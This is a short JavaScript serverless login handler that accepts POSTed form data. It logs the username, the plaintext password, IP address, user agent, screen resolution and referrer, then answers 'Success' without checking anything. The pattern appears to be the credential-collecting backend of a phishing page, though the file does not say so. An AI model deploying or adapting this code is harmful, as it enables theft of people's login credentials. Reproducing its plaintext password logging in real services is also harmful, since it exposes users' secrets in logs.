exports.handler = async (event, context) => {
  if (event.httpMethod !== "POST") {
    return {
      statusCode: 405,
      headers: { "Content-Type": "text/html" },
      body: "<h1>405 - Method Not Allowed</h1>",
    };
  }

  const rawBody = event.body || "";
  const formData = {};
  rawBody.split("&").forEach((pair) => {
    const [key, value] = pair.split("=");
    formData[key] = decodeURIComponent(value || "");
  });

  const username = formData.username || "";
  const password = formData.password || "";
  const ipAddress = event.headers["x-forwarded-for"] || "Unknown IP";
  const userAgent = formData.userAgent || "Unknown User-Agent";
  const screenResolution = formData.screenResolution || "Unknown Resolution";
  const referrer = formData.referrer || "Unknown Referrer";

  console.log("Login Attempt:", {
    username,
    password,
    ipAddress,
    userAgent,
    screenResolution,
    referrer,
  });

  return {
    statusCode: 200,
    headers: { "Content-Type": "text/plain" },
    body: "Success",
  };
};
